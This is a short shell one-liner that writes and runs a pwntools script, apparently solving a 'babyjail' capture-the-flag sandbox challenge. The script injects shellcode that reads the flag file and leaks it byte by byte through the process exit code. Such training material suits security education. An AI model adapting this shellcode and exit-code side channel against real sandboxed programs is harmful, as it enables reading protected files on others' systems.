echo 'import pwn
pwn.context.arch = "amd64"
flag =""
for i in range(100):
    p = pwn.process(["/challenge/babyjail_level10", "/flag"])
    read_shellcode = pwn.shellcraft.amd64.read(3, "rsp", 100).rstrip()
    exit_shellcode = pwn.shellcraft.amd64.exit("rax")
    shellcode = read_shellcode + "\n    mov rax, [rsp + {}]".format(i) + exit_shellcode
    assembly = pwn.asm(shellcode)
    p.send(assembly)
    p.recvall()
    exitVal = p.poll()
    flagLetter = chr(exitVal)
    flag += flagLetter
    print(flagLetter)
    if flagLetter == "}":
        print(flag)
        quit()' > sand.py && /bin/python3 sand.py && /challenge/babyjail_level10 < raw
